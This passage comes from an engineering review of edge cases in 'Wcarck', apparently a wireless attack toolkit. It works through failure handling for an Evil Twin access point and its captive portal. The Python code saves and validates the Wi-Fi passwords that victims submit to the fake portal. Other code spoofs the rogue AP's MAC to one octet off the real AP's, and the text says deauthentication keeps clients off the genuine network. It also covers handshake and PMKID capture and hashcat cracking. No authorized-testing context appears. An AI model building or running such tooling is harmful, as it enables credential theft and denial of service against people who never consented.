    async def handle_post(self, request: web.Request) -> web.Response:
        client_ip = request.remote
        async with self._submission_locks[client_ip]:
            # Check if this client already has a validated credential
            existing = await self._cred_repo.get_validated(
                ap_session_id=self._session_id,
                client_ip=client_ip,
            )
            if existing:
                # Already validated — show success page immediately
                return self._success_response()

            password = (await request.post()).get("password", "")
            if not password:
                return self._error_response("No password provided")

            cred_id = await self._cred_repo.save(
                password=password,
                client_ip=client_ip,
                client_mac=self._get_client_mac(request),
            )
            valid = await self._validator.validate(
                password, self._bssid, self._cap_path
            )
            await self._cred_repo.mark_validated(cred_id, valid)
            return self._success_response() if valid else self._invalid_response()
```

Clean up `_submission_locks` dict periodically to prevent memory growth:

```python
# After client disconnects or after Evil Twin session ends:
self._submission_locks.pop(client_ip, None)
```

### 6.3 DHCP Starvation — dnsmasq DHCP Pool Exhaustion

If many clients connect to the Evil Twin (or a client repeatedly disconnects and
reconnects with a new random MAC), dnsmasq's DHCP pool (`10.0.0.2–10.0.0.100`,
99 addresses) can be exhausted. New clients get no IP, see "Obtaining IP address..."
indefinitely, and never reach the portal.

**Fix: smaller lease time + monitor DHCP leases:**

```
# In dnsmasq config template:
dhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,2m    # 2-minute lease (not 12h)
dhcp-leasefile=/var/log/wcarck/dnsmasq-<session>.leases
```

2-minute leases mean randomized-MAC clients release their addresses faster.

**Monitor lease count:**

```python
async def _dhcp_watchdog(self, lease_file: str) -> None:
    while self._running:
        await asyncio.sleep(30.0)
        try:
            with open(lease_file) as f:
                lease_count = sum(1 for _ in f)
            if lease_count > 80:   # 80% pool usage
                await self._event_bus.publish(Event(
                    tag="ap.dhcp.pool_warning",
                    payload={"leases": lease_count, "pool_size": 99},
                ))
        except FileNotFoundError:
            pass
```

### 6.4 Real AP Comes Back Up During Evil Twin

**Scenario:** NASA (real AP) and NASA (Evil Twin) are both broadcasting. Clients
may reconnect to the real AP if it has better signal. Some clients will bounce
between the two.

**Detection:** The `ScanModule` will see TWO entries for the same SSID (real and Evil Twin).

**Issue:** The Evil Twin's `wlan_ap` MAC is deterministic (the real MAC of the TP-Link
adapter: `5C:62:8B:76:5D:E2`). If the operator's MAC matches neither the real AP's
BSSID nor a completely random MAC, clients may prefer the real AP by BSSID familiarity.

**Fix: MAC spoofing for the Evil Twin:**

```python
async def _setup_evil_twin_mac(self, target_bssid: str) -> str:
    """Spoof the Evil Twin MAC to be one digit off from the real AP."""
    # Common trick: increment last octet by 1
    parts = target_bssid.split(":")
    last = (int(parts[-1], 16) + 1) % 256
    spoofed = ":".join(parts[:-1] + [f"{last:02x}"])

    await run_cmd("ip", "link", "set", "wlan_ap", "down")
    await run_cmd("macchanger", "-m", spoofed, "wlan_ap")
    await run_cmd("ip", "link", "set", "wlan_ap", "up")

    return spoofed
```

The deauth engine should continue running on `wlan_mon` to keep clients off the
real AP while the Evil Twin is active — this is the standard Evil Twin workflow.

---

## 7. State Machine Edge Cases

### 7.1 Interrupted Mode Switch — Adapter Left in Unknown State

**Scenario:** The Evil Twin mode switch (monitor → AP) is running. After hostapd
starts but before dnsmasq starts, the operator hits Stop (or systemd kills the
service). The adapter is in AP mode with hostapd dead but no dnsmasq running.
On restart, the adapter is in AP mode, the lease DB says "released", and the
mode-switch state machine starts from the wrong state.

**Fix: mode verification on lease acquisition:**

```python
async def acquire(self, adapter_mac: str, lease_type: str, job_id: int) -> Lease:
    async with self._adapter_locks[adapter_mac]:
        # Verify the actual hardware state matches expected
        actual_mode = await get_actual_mode(adapter_mac)   # pyroute2 in executor
        expected_mode = self._LEASE_TYPE_TO_MODE[lease_type]

        if actual_mode != expected_mode and actual_mode != "managed":
            # Adapter is in a dirty state — attempt cleanup
            logger.warning(
                "adapter_dirty_state",
                adapter=adapter_mac,
                actual=actual_mode,
                expected=expected_mode,
            )
            await self._force_managed_mode(adapter_mac)   # reset to known state

        # ... proceed with lease acquisition
```

Also: add an `adapter_mode_audit` task that runs every 30 seconds and compares
the DB state with the actual nl80211 state. Publish `adapter.state_mismatch`
events for any discrepancy.

### 7.2 Job Queue Starvation — Priority Inversion

**Scenario:** A long-running `ScanModule` job (priority=LOW, running for hours)
holds the `monitor.scan` lease on `wlan_mon`. A `DeauthModule` job (priority=HIGH)
arrives and needs `monitor.locked` on the same adapter. The lease manager correctly
returns `409 RESOURCE_BUSY`. But there's no mechanism to promote the stop of the
scan job.

**Fix: lease preemption for HIGH priority jobs:**

```python
class RadioLeaseManager:
    async def acquire_or_preempt(
        self,
        adapter_mac: str,
        lease_type: str,
        job_id: int,
        priority: int,
    ) -> Lease | None:
        existing = self._active_leases.get(adapter_mac)
        if existing and self._conflicts(existing.lease_type, lease_type):
            existing_job = await self._job_repo.get(existing.job_id)
            if existing_job and priority < existing_job.priority:
                # Higher-priority job preempts lower-priority lease
                logger.info(
                    "lease_preempt",
                    preempting_job=job_id,
                    preempted_job=existing.job_id,
                )
                await self._job_runner.pause(existing.job_id)
                # The paused job should release its lease
                # ... then re-acquire for the new job
            else:
                return None   # can't preempt — same or lower priority
```

Preemption should PAUSE the scan (not kill it) and resume after the deauth completes.

---

## 8. Observability — Making Failures Diagnosable

The plan mentions `structlog` for logging. Here are the specific patterns that
make post-hoc debugging possible.

### 8.1 Structured Log Fields for Every Subprocess Call

```python
async def start(self, *args) -> None:
    self.proc = await asyncio.create_subprocess_exec(*args, ...)
    logger.info(
        "process_started",
        tool=args[0],
        pid=self.proc.pid,
        args=list(args[1:]),    # log full args — helps diagnose wrong config
        iface=self._iface,
        job_id=self._job_id,
    )

async def stop(self) -> None:
    start = time.monotonic()
    # ... stop cascade ...
    logger.info(
        "process_stopped",
        tool=self._tool,
        pid=self._pid,
        returncode=self.proc.returncode,
        duration_ms=round((time.monotonic() - start) * 1000),
        stop_signal="SIGTERM" if normal else "SIGKILL",
    )
```

### 8.2 Event Tags as Observability Points

Every significant state transition should be an event. The `AuditModule` (even in
its simple MVP form — plain `session_log`) should record:

```
adapter.mode_change   {iface, from, to, duration_ms, success}
lease.acquired        {adapter, lease_type, job_id}
lease.denied          {adapter, requested, active_job_id}
lease.orphaned        {adapter, lease_id, age_seconds}
job.transition        {job_id, from_state, to_state, reason}
tool.exit             {tool, pid, returncode, duration_ms}
rf.pmf_detected       {bssid, ssid, mfpc, mfpr}
rf.band_change        {bssid, ssid, from_channel, to_channel}
portal.submission     {client_ip, client_mac, result: valid|invalid|timeout}
db.write_error        {table, error, skipped_rows}
```

With structlog's JSON output, `journalctl -u wcarck -o json | jq 'select(.event=="lease.denied")'`
instantly shows all lease conflicts from the last session.

### 8.3 The `doctor.sh` Post-Mortem Mode

After any unclean shutdown, `doctor.sh --postmortem` should:

```bash
#!/bin/bash
# Check for adapter state drift
for IFACE in wlan_mon wlan_ap; do
  MODE=$(iw dev $IFACE info 2>/dev/null | grep "type" | awk '{print $2}')
  echo "[ADAPTER] $IFACE: $MODE"
done

# Check for orphaned processes
for TOOL in airodump-ng aireplay-ng hcxdumptool hostapd dnsmasq; do
  PIDS=$(pgrep -x $TOOL)
  [ -n "$PIDS" ] && echo "[ORPHAN] $TOOL PIDs: $PIDS"
done

# Check for orphaned nftables tables
nft list tables 2>/dev/null | grep "wcarck" && echo "[NFTABLES] Orphaned tables found"

# Check WAL file
WAL=/var/lib/wcarck/db.sqlite-wal
[ -f $WAL ] && echo "[DB] WAL file present: $(du -h $WAL | cut -f1)"

# Check lease table
sqlite3 /var/lib/wcarck/db.sqlite \
  "SELECT resource_id, lease_type, owner_module, acquired_at FROM resource_leases WHERE status='active';" \
  2>/dev/null | while read row; do echo "[LEAK] Active lease: $row"; done
```

---

## 9. Edge Case Summary Table

| # | Scenario | Detection | Response | Severity |
|---|---|---|---|---|
| 1.1 | Adapter USB unplug mid-session | AdapterWatchdog polls `ip link` every 2s | Cancel all jobs for that adapter, mark adapter GONE | Blocker |
| 1.2 | Kernel driver Oops | AdapterWatchdog + dmesg monitor | modprobe -r / modprobe reload, restore role | High |
| 1.3 | USB bus reset (both adapters gone briefly) | Per-adapter lock on recovery | Wait 2s, attempt recovery for each independently | High |
| 1.4 | MAC changes on adapter reconnect | Startup MAC verification | Log + warn; udev fallback rule by USB path | Medium |
| 1.5 | DKMS module silent build fail | `dkms status` check in install.sh | Exit install with actionable error message | Blocker |
| 2.1 | Grandchild processes after stop | psutil tree walk after proc.wait() | `_kill_process_tree(pid)` | High |
| 2.2 | airodump-ng CSV format changed | Header signature validation | Refuse to parse + emit `tool.version_mismatch` event | High |
| 2.3 | hashcat segfaults on GPU | returncode == -11 | Auto-retry with CPU backend | Medium |
| 2.4 | Scan produces no output (empty RF) | CSV liveness watchdog (30s threshold) | Emit `scan.stale` event, inform UI | Low |
| 3.1 | systemd-resolved port 53 conflict | install.sh pre-check | Disable DNSStubListener in resolved.conf | Blocker |
| 4.1 | WAL file from crash | open_database_safely() | PRAGMA wal_checkpoint(TRUNCATE) before open | High |
| 4.2 | Disk full mid-write | shutil.disk_usage() check before flush | Skip non-critical writes, emit disk_low event | High |
| 4.3 | SQLite CORRUPT | OperationalError on open | Backup + recreate, operator notified | Critical |
| 5.1 | AP changes band mid-deauth | Band detection in pursuit loop | Switch monitor adapter or stop pursuit | Medium |
| 5.2 | WPA3-SAE target | Parse RSN IE AKM suite | Show badge, disable EAPOL capture path | Medium |
| 5.3 | 802.11r FT handshake | Detect FT-PSK AKM suite | Switch to PMKID-only capture strategy | Medium |
| 5.4 | Client randomized MAC | Check locally-administered bit | Flag in UI, use IP as identifier instead | Low |
| 5.5 | AP goes offline mid-capture | `scan.network.lost` event subscription | Pause deauth, keep capture, wait for AP return | Medium |
| 6.1 | Concurrent portal submissions | Semaphore(1) on aircrack-ng | Serialize validations per handshake file | High |
| 6.2 | Double-submit (user click) | Per-client-IP lock | Skip if already validated | Medium |
| 6.3 | DHCP pool exhausted | Lease file line count watchdog | Short lease times (2m), warn at 80% | Medium |
| 6.4 | Real AP competes with Evil Twin | ScanModule sees two entries for SSID | MAC spoof + deauth real AP clients | Medium |
| 7.1 | Mode switch interrupted | Mode verification on lease acquire | Force managed mode → restart from clean state | High |
| 7.2 | Priority inversion on lease | Priority comparison on lease conflict | Pause lower-priority job, resume after | Medium |

---

*End of Wcarck Edge Cases & Exception Handling Review*
